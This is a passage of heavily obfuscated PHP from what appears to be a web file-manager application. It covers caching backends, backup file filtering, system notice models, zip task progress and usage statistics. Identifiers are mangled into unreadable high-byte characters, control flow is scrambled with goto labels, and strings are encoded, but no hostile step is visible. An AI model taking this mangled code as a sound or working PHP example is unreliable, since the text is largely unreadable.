$AãöÍ½ŠŞ = $b¡À‡’­Åê[$_SERVER[¬ı§†‰ú˜¼][76]]; $f¼†Ôíëˆõ = "\173\x69\157\x3a{$bùæÏÖ­¦è[$_SERVER[¬ı§†‰ú˜¼][716]]}\x7d" . substr($AãöÍ½ŠŞ, strlen("\x7b\x69\x6f\72{$b¡À‡’­Åê[$_SERVER[¬ı§†‰ú˜¼][790]]}\175")); goto DØÔ¯Ó…ù¼; B‡×¥ªŠ™: if ($b¸¼àô“Ãï >= 1024 * 1024 * 100) { $açÖ§Ò‚¦­ = array($_SERVER[¬ı§†‰ú˜¼][793] => $D¾¼ÅİÑ¿—, $_SERVER[¬ı§†‰ú˜¼][794] => $FøÀİŸ‚Ëº, $_SERVER[¬ı§†‰ú˜¼][795] => $Cê¥™—Ú); Backup::set($açÖ§Ò‚¦­); $b¸¼àô“Ãï = $cĞÀÔŒœÊª = 0; } goto E©ØÄ§ÉŒ; E©ØÄ§ÉŒ: } $cÛöÈ°«ƒí = count($dİ¦‰ôİïä); $BŞİÔ‰š·++; } while ($cÛöÈ°«ƒí == $Bù¿¾ÉÆ…õ); $Cé‰îÛœĞË->end(); goto c‘¸¨Ö—; C®ˆÀ×«Ò£: $F”ÖÏäôğÖ = !0; $fÉéô÷µÑã = $this->storeIds(); $BŞİÔ‰š· = 1; goto dæË½¯¥÷·; dæË½¯¥÷·: $Bù¿¾ÉÆ…õ = 1000; $b¸¼àô“Ãï = $cĞÀÔŒœÊª = 0; $Cóµ’µæ = array(); goto eÔä—öá§Û; f¦²é”à: $this->_fileFilter($Cóµ’µæ); return !0; goto aà›»ÍÍí; c‘¸¨Ö—: $açÖ§Ò‚¦­ = array($_SERVER[¬ı§†‰ú˜¼][796] => 1, $_SERVER[¬ı§†‰ú˜¼][474] => time(), $_SERVER[¬ı§†‰ú˜¼][736] => 1, $_SERVER[¬ı§†‰ú˜¼][793] => $D¾¼ÅİÑ¿—, $_SERVER[¬ı§†‰ú˜¼][785] => $bà¨•ÙõØª, $_SERVER[¬ı§†‰ú˜¼][784] => $d¼áì¥¹õ‰, $_SERVER[¬ı§†‰ú˜¼][797] => time()); if ($cĞÀÔŒœÊª) { $açÖ§Ò‚¦­[$_SERVER[¬ı§†‰ú˜¼][794]] = $FøÀİŸ‚Ëº; $açÖ§Ò‚¦­[$_SERVER[¬ı§†‰ú˜¼][795]] = $Cê¥™—Ú; } Backup::set($açÖ§Ò‚¦­); goto f¦²é”à; aà›»ÍÍí: } private function _fileExist($bĞÉÈÌÊ, &$d›Ï‡˜¸Ê, $b ÎÊ”•Ï) { goto B£‘ëÑô; d’¬í‡¾ÃÊ: if (!in_array($bĞÉÈÌÊ[$cÎÕ·Ûëôò[790]], $b ÎÊ”•Ï)) { return !1; } if (IO::exist($AĞ‹ Û„Á˜)) { return !0; } $C¶¡À—›‚† = get_path_father($AĞ‹ Û„Á˜); goto DË—Üåè¦¿; DË—Üåè¦¿: if (IO::exist($C¶¡À—›‚†)) { $d›Ï‡˜¸Ê[] = $bĞÉÈÌÊ[$cÎÕ·Ûëôò[445]]; return !1; } $BËÛğâÕÃ = array($cÎÕ·Ûëôò[790] => $bĞÉÈÌÊ[$cÎÕ·Ûëôò[790]], $cÎÕ·Ûëôò[76] => array($cÎÕ·Ûëôò[379], "{$C¶¡À—›‚†}\45")); $e‡±›‚ø‘ö = Model($cÎÕ·Ûëôò[748])->where($BËÛğâÕÃ)->field($cÎÕ·Ûëôò[446])->select(); goto B¢˜“Â·†; B¢˜“Â·†: $d›Ï‡˜¸Ê = array_merge($d›Ï‡˜¸Ê, array_to_keyvalue($e‡±›‚ø‘ö, $cÎÕ·Ûëôò[33], $cÎÕ·Ûëôò[445])); return !1; goto cœ­ÓÚŸ•Ë; B£‘ëÑô: $cÎÕ·Ûëôò =& $_SERVER[¬ı§†‰ú˜¼]; $AĞ‹ Û„Á˜ = $bĞÉÈÌÊ[$cÎÕ·Ûëôò[76]]; if (in_array($bĞÉÈÌÊ[$cÎÕ·Ûëôò[445]], $d›Ï‡˜¸Ê)) { return !1; } goto d’¬í‡¾ÃÊ; cœ­ÓÚŸ•Ë: } private function _fileFilter($FÕÆòÓÇ¯•) { $cãæ‹ÍÖÍ =& $_SERVER[¬ı§†‰ú˜¼]; if (empty($FÕÆòÓÇ¯•)) { return; } $aáËàİ³ Í = array($cãæ‹ÍÖÍ[445] => array($cãæ‹ÍÖÍ[7], array_unique($FÕÆòÓÇ¯•))); $a’ßŒ´Šó = Model($cãæ‹ÍÖÍ[798])->where($aáËàİ³ Í)->field($cãæ‹ÍÖÍ[394])->select(); foreach ($a’ßŒ´Šó as $dîö·ÇëÁ) { Model($cãæ‹ÍÖÍ[798])->remove($dîö·ÇëÁ[$cãæ‹ÍÖÍ[394]], !1); } } private function storeIds() { $EèÌÜ¤ãÉ =& $_SERVER[¬ı§†‰ú˜¼]; $cêÖÕ˜ĞÁá = Model($EèÌÜ¤ãÉ[728])->listData(); $fŞ²Î„ïÀ = array(); $dÙ•°ƒ‰©ò = $GLOBALS[$EèÌÜ¤ãÉ[6]][$EèÌÜ¤ãÉ[88]][$EèÌÜ¤ãÉ[799]]; foreach ($cêÖÕ˜ĞÁá as $cÁ‰µ©Ø§ö) { $DçÒŠïñ©ç = strtolower($cÁ‰µ©Ø§ö[$EèÌÜ¤ãÉ[94]]); if (!isset($dÙ•°ƒ‰©ò[$DçÒŠïñ©ç])) { continue; } $DÑ‹òàğØê = $EèÌÜ¤ãÉ[72] . (isset($dÙ•°ƒ‰©ò[$DçÒŠïñ©ç]) ? $dÙ•°ƒ‰©ò[$DçÒŠïñ©ç] : ucfirst($DçÒŠïñ©ç)); if (!class_exists($DÑ‹òàğØê)) { continue; } $fŞ²Î„ïÀ[] = $cÁ‰µ©Ø§ö[$EèÌÜ¤ãÉ[392]]; } return $fŞ²Î„ïÀ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto c°í´‰œÉ; Eóİ©éÖ¾Œ: switch ($Cô£†¤ß˜Í[$A²éäĞµƒ[800]]) { case $A²éäĞµƒ[17]: self::$handle = Model($A²éäĞµƒ[802]); break; case $A²éäĞµƒ[803]: self::$handle = new CacheRedis($e«³ìÔÔôº, $D‰Ò‚ã); break; case $A²éäĞµƒ[804]: self::$handle = new CacheMemcached($e«³ìÔÔôº, $D‰Ò‚ã); break; case $A²éäĞµƒ[192]: self::$handle = new CacheFile($e«³ìÔÔôº, $D‰Ò‚ã); break; default: break; } return self::$handle; goto EÙ¥”‚ÔÕ; EÅ­ÇÑ´Ú: $Cô£†¤ß˜Í = $GLOBALS[$A²éäĞµƒ[6]][$A²éäĞµƒ[346]]; $e«³ìÔÔôº = $Cô£†¤ß˜Í[$Cô£†¤ß˜Í[$A²éäĞµƒ[800]]]; $D‰Ò‚ã = $Cô£†¤ß˜Í[$A²éäĞµƒ[801]]; goto Eóİ©éÖ¾Œ; c°í´‰œÉ: $A²éäĞµƒ =& $_SERVER[¬ı§†‰ú˜¼]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto EÅ­ÇÑ´Ú; EÙ¥”‚ÔÕ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($cæâÏ‰ğ÷) { if (is_array($cæâÏ‰ğ÷) || is_object($cæâÏ‰ğ÷)) { $cæâÏ‰ğ÷ = json_encode($cæâÏ‰ğ÷); } $cæâÏ‰ğ÷ = rawurlencode($cæâÏ‰ğ÷); return md5(KOD_SITE_ID . $_SERVER[¬ı§†‰ú˜¼][71] . $cæâÏ‰ğ÷); } public static function get($eÂ‡‰¥ã¨Ü, $b‰¶’á½©‡ = false) { $c§¯äâàğì = self::key($eÂ‡‰¥ã¨Ü); if ($b‰¶’á½©‡) { return unserialize(self::init()->get($c§¯äâàğì)); } if (!isset(self::$memoryCache[$c§¯äâàğì])) { $aŞ—í = self::init()->get($c§¯äâàğì); self::$memoryCache[$c§¯äâàğì] = unserialize($aŞ—í); } return self::$memoryCache[$c§¯äâàğì]; } public static function set($bÓÛ˜ÀÆ°‡, $FƒºÊÇøŒÏ, $d‰àÜóîíÂ = false) { goto Dã‚†®ˆÈğ; CÔ›âÃ¿Ô·: CacheLock::lock($bÓÛ˜ÀÆ°‡); $FëåÚªÊ›Ÿ = self::init()->set($açÇ²²ÄÉÚ, serialize($FƒºÊÇøŒÏ), $d‰àÜóîíÂ); self::$memoryCache[$açÇ²²ÄÉÚ] = $FƒºÊÇøŒÏ; goto Aá×ÎÕÜ; Dã‚†®ˆÈğ: $açÇ²²ÄÉÚ = self::key($bÓÛ˜ÀÆ°‡); if (isset(self::$memoryCache[$açÇ²²ÄÉÚ]) && self::$memoryCache[$açÇ²²ÄÉÚ] === $FƒºÊÇøŒÏ) { return !0; } if ($d‰àÜóîíÂ === 0) { self::$memoryCache[$açÇ²²ÄÉÚ] = $FƒºÊÇøŒÏ; return !0; } goto CÔ›âÃ¿Ô·; Aá×ÎÕÜ: CacheLock::unlock($bÓÛ˜ÀÆ°‡); return $FëåÚªÊ›Ÿ; goto b˜Û§”¯‰; b˜Û§”¯‰: } public static function getCall($B®çõŸ°, $A–ŞÀİ²§, $aô¢¿®Úô°, $e»Ê‡ôáé” = array()) { $Cê˜©‡„² = self::get($B®çõŸ°); if ($Cê˜©‡„²) { return $Cê˜©‡„²; } $Cê˜©‡„² = call_user_func_array($aô¢¿®Úô°, $e»Ê‡ôáé”); self::set($B®çõŸ°, $Cê˜©‡„², $A–ŞÀİ²§); return $Cê˜©‡„²; } public static function remove($B¢«Ö·ºŞÑ) { goto a» ÃÈòİÓ; a» ÃÈòİÓ: $AâŸ ĞæÛØ = self::key($B¢«Ö·ºŞÑ); unset(self::$memoryCache[$AâŸ ĞæÛØ]); self::clearTimeout(); goto cÛ„›øµ¸¸; bí¥Ùª‰¨: return $eœ« ğÃÚÅ; goto EÙ ‹˜«ğ«; cÛ„›øµ¸¸: CacheLock::lock($B¢«Ö·ºŞÑ); $eœ« ğÃÚÅ = self::init()->remove($AâŸ ĞæÛØ); CacheLock::unlock($B¢«Ö·ºŞÑ); goto bí¥Ùª‰¨; EÙ ‹˜«ğ«: } public static function removeMemory($B†¯Æ¿›»”) { $EãÚÔÁ®¼™ = self::key($B†¯Æ¿›»”); unset(self::$memoryCache[$EãÚÔÁ®¼™]); } public static function clearMemory($F–æÓä—Ô = false) { if ($F–æÓä—Ô) { $F–æÓä—Ô = self::key($F–æÓä—Ô); unset(self::$memoryCache[$F–æÓä—Ô]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¬ı§†‰ú˜¼][805])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¬ı§†‰ú˜¼][806])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($fô¥‘ÉÂãã, $A×¬›„‹á) { $Bêøµõ—ÕÄ =& $_SERVER[¬ı§†‰ú˜¼]; $this->cachePath = $fô¥‘ÉÂãã[$Bêøµõ—ÕÄ[76]]; $this->prefix = $Bêøµõ—ÕÄ[807]; $this->cacheTime = $A×¬›„‹á; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($c›Ëµ‡‡™¨) { $eğ—¿……Ñƒ =& $_SERVER[¬ı§†‰ú˜¼]; $c›Ëµ‡‡™¨ = str_replace(array($eğ—¿……Ñƒ[808], $eğ—¿……Ñƒ[97], $eğ—¿……Ñƒ[70]), $eğ—¿……Ñƒ[809], $c›Ëµ‡‡™¨); return $this->cachePath . $eğ—¿……Ñƒ[810] . $c›Ëµ‡‡™¨ . $eğ—¿……Ñƒ[811]; } public function set($fÆ·èåÛÚ¯, $Eİ‚‰š„¤, $a¥‚ÙŸÕè = false) { $C„¯äÅóéĞ = $this->getFile($fÆ·èåÛÚ¯); if (file_put_contents($C„¯äÅóéĞ, $this->prefix . $Eİ‚‰š„¤, LOCK_EX)) { return !0; } @unlink($C„¯äÅóéĞ); return !1; } public function get($BİØ¦¼•™ä) { $d’ßØë´¥ = $this->getFile($BİØ¦¼•™ä); if (file_exists($d’ßØë´¥) && filemtime($d’ßØë´¥) < time() - $this->cacheTime) { @unlink($d’ßØë´¥); return !1; } $c¹µ°ˆÌÆ¿ = @file_get_contents($d’ßØë´¥); return substr($c¹µ°ˆÌÆ¿, strlen($this->prefix)); } public function remove($A³øãˆÜà) { $a—„‹‘Ø—Ì = $this->getFile($A³øãˆÜà); return @unlink($a—„‹‘Ø—Ì); } public function deleteAll() { $FšŞíçİ =& $_SERVER[¬ı§†‰ú˜¼]; $fŸŒµ­‡ğ± = scandir($this->cachePath); foreach ($fŸŒµ­‡ğ± as $dğ—õ…Ò‚‘) { $f©Ì¾ºË‡ = $this->cachePath . $dğ—õ…Ò‚‘; if (strpos($f©Ì¾ºË‡, $FšŞíçİ[811]) && strpos($f©Ì¾ºË‡, $FšŞíçİ[812])) { @unlink($f©Ì¾ºË‡); } } } public function clearTimeout() { $fï–Ëë¸ìù =& $_SERVER[¬ı§†‰ú˜¼]; $eØíÜîâŞ = scandir($this->cachePath); foreach ($eØíÜîâŞ as $f‘Øíß‹øï) { $D†ãÖÏšë‚ = $this->cachePath . $f‘Øíß‹øï; if (strpos($D†ãÖÏšë‚, $fï–Ëë¸ìù[811]) && strpos($D†ãÖÏšë‚, $fï–Ëë¸ìù[812]) && filemtime($D†ãÖÏšë‚) < time() - $this->cacheTime) { @unlink($D†ãÖÏšë‚); } } } } goto C¶õ¶Çø·; Fó¿ÔÑÄ÷: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\156\x6f\x74\x69\x63\145\114\x69\x73\164"; public $field = array("\x6e\x61\155\x65", "\143\157\156\x74\x65\156\x74", "\x61\x75\164\150", "\x6d\157\144\145", "\x74\151\x6d\x65", "\x74\171\160\145", "\x6c\145\166\x65\154", "\145\x6e\141\x62\x6c\145", "\x73\x6f\x72\x74"); public function listData($b˜àà¼ÄÈ = false, $Dñê§ÃÖ = "\163\157\162\x74", $A¢ÜŞŒâÕ˜ = false) { return parent::listData($b˜àà¼ÄÈ, $Dñê§ÃÖ, $A¢ÜŞŒâÕ˜); } public function add($A¾©Ç‹— °) { $fàÙ¦êµ¼‰ =& $_SERVER[¬ı§†‰ú˜¼]; $Fö‹Ê„à´ = time(); if ($A¾©Ç‹— °[$fàÙ¦êµ¼‰[12]] == $fàÙ¦êµ¼‰[2097]) { $Fö‹Ê„à´ = strtotime($A¾©Ç‹— °[$fàÙ¦êµ¼‰[196]]); } $A¾©Ç‹— °[$fàÙ¦êµ¼‰[196]] = $Fö‹Ê„à´; return parent::insert($A¾©Ç‹— °); } public function update($Fµò²æÈ²°, $eÌÌ¶‹ÖÉª) { goto dËéÕæŠñˆ; dËéÕæŠñˆ: $bë¯³õ§‹Ó =& $_SERVER[¬ı§†‰ú˜¼]; $bĞÇš¸öõÄ = $this->listData($Fµò²æÈ²°); if (!$bĞÇš¸öõÄ) { return !1; } goto B½‹æªÄšĞ; B½‹æªÄšĞ: $aĞÕ½š‡‘Î = time(); if ($eÌÌ¶‹ÖÉª[$bë¯³õ§‹Ó[12]] == $bë¯³õ§‹Ó[2097]) { $aĞÕ½š‡‘Î = strtotime($eÌÌ¶‹ÖÉª[$bë¯³õ§‹Ó[196]]); } $eÌÌ¶‹ÖÉª[$bë¯³õ§‹Ó[196]] = $aĞÕ½š‡‘Î; goto a˜˜¸ÄòÛÆ; a˜˜¸ÄòÛÆ: return parent::update($Fµò²æÈ²°, $eÌÌ¶‹ÖÉª); goto A»½¿”Å; A»½¿”Å: } public function remove($A‰Û†Ş»ˆ) { $F¸Êºê×œ = $this->listData($A‰Û†Ş»ˆ); if (!$F¸Êºê×œ || $F¸Êºê×œ[$_SERVER[¬ı§†‰ú˜¼][1169]]) { return !1; } return parent::remove($A‰Û†Ş»ˆ); } public function sort($d·¬‚ËØ­İ, $BÛÆåæ’ô) { return parent::update($d·¬‚ËØ­İ, $BÛÆåæ’ô); } public function enable($fô‹Àå‘ˆ, $f­£”¶¸³±) { return parent::update($fô‹Àå‘ˆ, array($_SERVER[¬ı§†‰ú˜¼][2098] => $f­£”¶¸³±)); } private function initUserOption() { $A¶‰¿½õÓò =& $_SERVER[¬ı§†‰ú˜¼]; $this->optionType = $A¶‰¿½õÓò[2099]; $this->modelType = $A¶‰¿½õÓò[2100]; $this->field = array($A¶‰¿½õÓò[2101], $A¶‰¿½õÓò[28], $A¶‰¿½õÓò[196], $A¶‰¿½õÓò[29], $A¶‰¿½õÓò[2102], $A¶‰¿½õÓò[714], $A¶‰¿½õÓò[189]); } public function userNoticeGet($EÅŒŒÄ¾› = false) { $this->initUserOption(); return parent::listData($EÅŒŒÄ¾›, $_SERVER[¬ı§†‰ú˜¼][392], !0); } public function userNoticeAdd($Cˆó±ÔÄò) { $c–—±Ä§§ =& $_SERVER[¬ı§†‰ú˜¼]; $this->initUserOption(); $d¶®™öÊº = $this->findByKey($c–—±Ä§§[2101], $Cˆó±ÔÄò[$c–—±Ä§§[392]]); if ($d¶®™öÊº) { return !0; } $Fø‚§ğºë = array($c–—±Ä§§[2101] => $Cˆó±ÔÄò[$c–—±Ä§§[392]], $c–—±Ä§§[28] => $Cˆó±ÔÄò[$c–—±Ä§§[28]], $c–—±Ä§§[196] => $Cˆó±ÔÄò[$c–—±Ä§§[196]], $c–—±Ä§§[29] => isset($Cˆó±ÔÄò[$c–—±Ä§§[29]]) ? $Cˆó±ÔÄò[$c–—±Ä§§[29]] : 1, $c–—±Ä§§[2102] => isset($Cˆó±ÔÄò[$c–—±Ä§§[2102]]) ? $Cˆó±ÔÄò[$c–—±Ä§§[2102]] : 0, $c–—±Ä§§[714] => 0, $c–—±Ä§§[189] => 0); return parent::insert($Fø‚§ğºë); } public function userNoticeEdit($fàØĞˆÊë², $cĞŞÙÀšµ…) { $this->initUserOption(); return parent::update($fàØĞˆÊë², $cĞŞÙÀšµ…); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\145\155\137\x6f\160\164\x69\157\156"; protected $jsonField = array("\155\x65\x6e\165", "\x72\157\x6c\145", "\162\x6f\154\145\x47\x72\x6f\165\160", "\x72\145\x67\x69\x73\164", "\x65\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($bğ…í²İ“) { return "\123\171\x73\164\x65\155\x4f\x70\164\151\x6f\156\137{$bğ…í²İ“}"; } protected function optionDefault($aàƒ‰Ûô¾é = '') { $EÏ‘ìÇ„ç =& $_SERVER[¬ı§†‰ú˜¼]; if ($aàƒ‰Ûô¾é == $EÏ‘ìÇ„ç[33]) { return $GLOBALS[$EÏ‘ìÇ„ç[6]][$EÏ‘ìÇ„ç[377]]; } } } class SystemRecordModel extends ModelBaseLight { } goto FŠ©¶²ÎôË; DÂèŠÆ•…: class TaskZip extends TaskFileTransfer { protected function startAfter() { $C›­¦èíâñ =& $_SERVER[¬ı§†‰ú˜¼]; parent::startAfter(); Hook::bind($C›­¦èíâñ[1614], array($this, $C›­¦èíâñ[1609])); $aòšñ ñÔ¡ =& $this->task; $aòšñ ñÔ¡[$C›­¦èíâñ[1611]] = $C›­¦èíâñ[1093]; if (!$aòšñ ñÔ¡[$C›­¦èíâñ[1431]]) { $aòšñ ñÔ¡[$C›­¦èíâñ[1431]] = LNG($C›­¦èíâñ[1615]); } } protected function endAfter() { $bÈ¡å¶†ÈÉ =& $_SERVER[¬ı§†‰ú˜¼]; parent::endAfter(); Hook::unbind($bÈ¡å¶†ÈÉ[1614], array($this, $bÈ¡å¶†ÈÉ[1609])); } public function updateAfter() { $eÙÑéÄíÖ¨ =& $_SERVER[¬ı§†‰ú˜¼]; $a‰ğ«±†˜® =& $this->task; if (!$a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1020]] || !$a‰ğ«±†˜®[$eÙÑéÄíÖ¨[724]]) { return; } if ($a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1611]] == $eÙÑéÄíÖ¨[1093]) { $CÃíšâ„ƒ˜ = $a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1571]]; if ($a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1572]] != $eÙÑéÄíÖ¨[1093]) { $CÃíšâ„ƒ˜ = 0; } $F—‹“”í—À = ($a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1575]] + $CÃíšâ„ƒ˜) / $a‰ğ«±†˜®[$eÙÑéÄíÖ¨[724]]; $a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1528]] = $F—‹“”í—À * 0.3; } else { if ($a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1611]] == $eÙÑéÄíÖ¨[310]) { $F—‹“”í—À = $a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1035]] / $a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1020]]; $a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1528]] = 0.3 + $F—‹“”í—À * 0.5; } else { if ($a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1611]] == $eÙÑéÄíÖ¨[107]) { $F—‹“”í—À = 0; if ($a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1570]]) { $F—‹“”í—À = $a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1571]] / $a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1570]]; } $a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1528]] = 0.3 + 0.5 + $F—‹“”í—À * 0.2; } } } if ($a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1528]] > 0) { $dô°Ûßèå¦ = timeFloat() - $a‰ğ«±†˜®[$eÙÑéÄíÖ¨[750]] - $a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1531]]; $a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1532]] = $dô°Ûßèå¦ * (1 - $a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1528]]) / $a‰ğ«±†˜®[$eÙÑéÄíÖ¨[1528]]; } } public function copyFileStart($eÑô‚®‰‘, $e§…–ˆÊº, $fÉŸ´ñ¶£, $BÜ­½æ¦ŒÉ, $a§”Ç£í³æ, $E¢Î“ƒ¨Òİ) { $cï™§î¬‘ =& $_SERVER[¬ı§†‰ú˜¼]; parent::copyFileStart($eÑô‚®‰‘, $e§…–ˆÊº, $fÉŸ´ñ¶£, $BÜ­½æ¦ŒÉ, $a§”Ç£í³æ, $E¢Î“ƒ¨Òİ); $bªÔÜää„ê =& $this->task; if ($bªÔÜää„ê[$cï™§î¬‘[1611]] == $cï™§î¬‘[310]) { $bªÔÜää„ê[$cï™§î¬‘[1611]] = $cï™§î¬‘[107]; } $this->update(); } public function copyFileEnd($D“Œ¤‰×İ, $A­ß±®ÍºÎ, $BëÕ¶¯¶˜ï, $FÖ±­Æ…õà, $déË›«£Ñ§, $C·öŠÌÀçë) { $e„§Ù·øÎ =& $_SERVER[¬ı§†‰ú˜¼]; $C¥§Éºœ® =& $this->task; $C¥§Éºœ®[$e„§Ù·øÎ[1571]] = $C¥§Éºœ®[$e„§Ù·øÎ[1570]]; $C¥§Éºœ®[$e„§Ù·øÎ[1575]] += $C¥§Éºœ®[$e„§Ù·øÎ[1570]]; $C¥§Éºœ®[$e„§Ù·øÎ[1572]] = $e„§Ù·øÎ[33]; $this->update(); } public function nameParse($CøÃ‚ºÁå) { $BÒŒìğªˆ± =& $_SERVER[¬ı§†‰ú˜¼]; $E…å¿«Ş¢Œ =& $this->task; if ($E…å¿«Ş¢Œ[$BÒŒìğªˆ±[1035]] < $E…å¿«Ş¢Œ[$BÒŒìğªˆ±[1020]]) { $fœ¥êÔ£Ë = get_path_this($CøÃ‚ºÁå); if (strstr($fœ¥êÔ£Ë, $BÒŒìğªˆ±[95])) { $E…å¿«Ş¢Œ[$BÒŒìğªˆ±[1035]] += 1; } } if ($E…å¿«Ş¢Œ[$BÒŒìğªˆ±[1611]] == $BÒŒìğªˆ±[1093]) { $E…å¿«Ş¢Œ[$BÒŒìğªˆ±[1611]] = $BÒŒìğªˆ±[310]; } $E…å¿«Ş¢Œ[$BÒŒìğªˆ±[1568]] = $CøÃ‚ºÁå; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($C‚‡ŒÜ ) { $D›„îõ¤–¸ =& $_SERVER[¬ı§†‰ú˜¼]; $DçÉ‰¤ÏÅê = array($D›„îõ¤–¸[561] => array($D›„îõ¤–¸[29] => $D›„îõ¤–¸[1616], $D›„îõ¤–¸[270] => array($D›„îõ¤–¸[221], $D›„îõ¤–¸[726], $D›„îõ¤–¸[1617], $D›„îõ¤–¸[1618])), $D›„îõ¤–¸[1619] => array($D›„îõ¤–¸[29] => $D›„îõ¤–¸[1620], $D›„îõ¤–¸[270] => array($D›„îõ¤–¸[221], $D›„îõ¤–¸[724], $D›„îõ¤–¸[1621], $D›„îõ¤–¸[1622], $D›„îõ¤–¸[1623]))); if (!isset($DçÉ‰¤ÏÅê[$C‚‡ŒÜ ])) { return !1; } $this->optionType = $DçÉ‰¤ÏÅê[$C‚‡ŒÜ ][$D›„îõ¤–¸[29]]; $this->field = $DçÉ‰¤ÏÅê[$C‚‡ŒÜ ][$D›„îõ¤–¸[270]]; return !0; } public function listData($eŞœï„ªÛ = false, $dÖÂÊÄÁä£ = "\155\x6f\144\x69\146\x79\x54\151\155\145", $c«‹ÎÌ²¶Ú = false) { return parent::listData($eŞœï„ªÛ, $dÖÂÊÄÁä£, $c«‹ÎÌ²¶Ú); } public function trendList($DÑ©ô§Ì) { goto FÕ™Ãéƒ; FÕ™Ãéƒ: $b”’‹÷¼’ =& $_SERVER[¬ı§†‰ú˜¼]; $E‰”¸¸ò‡‰ = $this->listData(); if ($E‰”¸¸ò‡‰) { $B¸ÓÉ–µè¶ = end($E‰”¸¸ò‡‰); $C‹µ¼ÆŠ = date($b”’‹÷¼’[1624], strtotime($b”’‹÷¼’[1625])); if ($B¸ÓÉ–µè¶[$b”’‹÷¼’[221]] == $C‹µ¼ÆŠ) { return $E‰”¸¸ò‡‰; } $D»ù³é…ø¥ = strtotime($B¸ÓÉ–µè¶[$b”’‹÷¼’[221]]); } goto eñÂ„½ã”ä; fôÛ×Ô­Üó: foreach ($C–Ê½‘Í¤¢ as $C‹µ¼ÆŠ) { $this->{$DùÛÇÂ‰·‡}($C‹µ¼ÆŠ); } return $this->listData(); goto eÃ‚Åê„; eñÂ„½ã”ä: if (!isset($D»ù³é…ø¥)) { $cÔ¿‹Ö²¢İ = $DÑ©ô§Ì == $b”’‹÷¼’[561] ? $b”’‹÷¼’[505] : $b”’‹÷¼’[798]; $D»ù³é…ø¥ = Model($cÔ¿‹Ö²¢İ)->min($b”’‹÷¼’[193]); } $DùÛÇÂ‰·‡ = $b”’‹÷¼’[1626] . ucfirst($DÑ©ô§Ì); $C–Ê½‘Í¤¢ = $this->dateList($D»ù³é…ø¥); goto fôÛ×Ô­Üó; eÃ‚Åê„: } private function dateList($d‰˜ô¾æÄ ) { $eŠ°ù±Ø¹Ù =& $_SERVER[¬ı§†‰ú˜¼]; $dƒ‹ìè¤¨Ã = $d‰˜ô¾æÄ ; $BáŠ˜øâ‡Œ = strtotime($eŠ°ù±Ø¹Ù[1625]); $AÌ„‡“»Œ‘ = array(); while ($dƒ‹ìè¤¨Ã <= $BáŠ˜øâ‡Œ) { $AÌ„‡“»Œ‘[] = date($eŠ°ù±Ø¹Ù[1624], $dƒ‹ìè¤¨Ã); $dƒ‹ìè¤¨Ã = strtotime($eŠ°ù±Ø¹Ù[1627], $dƒ‹ìè¤¨Ã); } return $AÌ„‡“»Œ‘; } public function _recordUser($bç ™ç‚ª‚ = '') { goto B˜Úâ›½…; bçØöÔŒ»‹: $BğÃ¾´—Š = array($cºæ¥óŒ¿[193] => array($cºæ¥óŒ¿[969], $Eøã³í‚ÉÆ)); $b•çç™ §Ö = Model($cºæ¥óŒ¿[505])->where($BğÃ¾´—Š)->count($cºæ¥óŒ¿[1527]); $BğÃ¾´—Š[$cºæ¥óŒ¿[193]] = array($cºæ¥óŒ¿[330], array($b—šïëÙÁ©, $Eøã³í‚ÉÆ)); goto BÕ¡ó»çØÚ; eŠòÅÃô©: $d©†÷²ß³ï = array($cºæ¥óŒ¿[221] => $bç ™ç‚ª‚, $cºæ¥óŒ¿[726] => (int) $b•çç™ §Ö, $cºæ¥óŒ¿[1617] => (int) $AÏ©ô–™‘ , $cºæ¥óŒ¿[1618] => (int) $A´á„ÀÕÜ); return $this->insert($d©†÷²ß³ï); goto EÉÅ¾Ôâ¿È; B˜Úâ›½…: $cºæ¥óŒ¿ =& $_SERVER[¬ı§†‰ú˜¼]; $b—šïëÙÁ© = strtotime(date($cºæ¥óŒ¿[1628], strtotime($bç ™ç‚ª‚))); $Eøã³í‚ÉÆ = strtotime(date($cºæ¥óŒ¿[1629], strtotime($bç ™ç‚ª‚))); goto bçØöÔŒ»‹; BÕ¡ó»çØÚ: $AÏ©ô–™‘  = Model($cºæ¥óŒ¿[505])->where($BğÃ¾´—Š)->count($cºæ¥óŒ¿[1527]); $BğÃ¾´—Š[$cºæ¥óŒ¿[29]] = $cºæ¥óŒ¿[1630]; $A´á„ÀÕÜ = Model($cºæ¥óŒ¿[1631])->where($BğÃ¾´—Š)->count($cºæ¥óŒ¿[1632]); goto eŠòÅÃô©; EÉÅ¾Ôâ¿È: } public function _recordStore($fÄÉÔ–Ëª› = '') { goto Aö†ÛîĞåï; Aíè­‹×: $aÆîœ«±ğ = Model($c„‰…ÜãÊí[448])->where($Eô†õ‡ÇÚ²)->sum($c„‰…ÜãÊí[78]); 